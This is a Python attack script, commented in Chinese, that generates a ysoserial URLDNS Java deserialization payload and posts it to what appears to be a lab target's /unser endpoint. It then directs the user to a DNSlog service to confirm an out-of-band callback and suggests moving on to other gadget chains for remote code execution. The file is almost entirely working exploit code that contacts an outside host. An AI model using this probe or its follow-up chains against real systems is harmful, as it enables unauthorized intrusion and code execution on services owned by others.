#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
快速测试 - URLDNS 链
用于确认反序列化漏洞是否存在
"""

import requests
import base64
import subprocess
import sys

TARGET = "http://5bd9497ae8ad.target.yijinglab.com/unser"

# 从命令行参数获取 dnslog 域名，或使用默认值
if len(sys.argv) > 1:
    DNSLOG = sys.argv[1]
else:
    DNSLOG = input("请输入 DNSlog 域名 (例: xxx.dnslog.cn): ").strip()
    if not DNSLOG:
        print("[!] DNSlog 域名不能为空")
        sys.exit(1)

print("=" * 60)
print(f"  URLDNS 反序列化测试")
print("=" * 60)
print(f"[*] 目标: {TARGET}")
print(f"[*] DNSlog: {DNSLOG}")
print()

print("[*] 生成 URLDNS payload...")

java_opts = [
    "--add-opens=java.base/java.net=ALL-UNNAMED",
    "--add-opens=java.base/java.util=ALL-UNNAMED"
]

try:
    result = subprocess.run(
        ["java"] + java_opts + ["-jar", "ysoserial.jar", "URLDNS", f"http://{DNSLOG}"],
        capture_output=True,
        timeout=10
    )
    
    if result.returncode != 0:
        print(f"[!] 生成失败:")
        print(result.stderr.decode('utf-8', errors='ignore'))
        sys.exit(1)
    
    payload = base64.b64encode(result.stdout).decode()
    print(f"[+] Payload 生成成功 ({len(result.stdout)} 字节)")
    
except Exception as e:
    print(f"[!] 错误: {e}")
    sys.exit(1)

print(f"[*] 发送 payload...")

try:
    response = requests.post(
        TARGET, 
        data={"data": payload},
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        timeout=10
    )
    
    print(f"[+] 响应状态码: {response.status_code}")
    
    if response.status_code == 200:
        print(f"[+] 响应内容: {response.text[:200]}")
        print("\n✅ 服务器返回 200，反序列化可能成功执行")
    elif response.status_code == 500:
        print(f"[!] 服务器返回 500 错误")
        print(f"    响应: {response.text[:200]}")
        print("\n⚠️  可能原因:")
        print("    1. 反序列化过程抛出异常（正常，URLDNS 不影响）")
        print("    2. toString() 方法执行失败")
    else:
        print(f"[!] 未预期的状态码: {response.status_code}")
    
except requests.exceptions.Timeout:
    print("[!] 请求超时")
except Exception as e:
    print(f"[!] 请求失败: {e}")

print("\n" + "=" * 60)
print("📝 下一步:")
print(f"  1. 访问 DNSlog 平台: http://dnslog.cn")
print(f"  2. 查看是否收到来自目标服务器的 DNS 查询")
print(f"  3. 如果收到 {DNSLOG} 的 DNS 记录，说明:")
print("     ✅ 反序列化漏洞存在")
print("     ✅ 可以尝试其他利用链进行 RCE")
print("=" * 60)
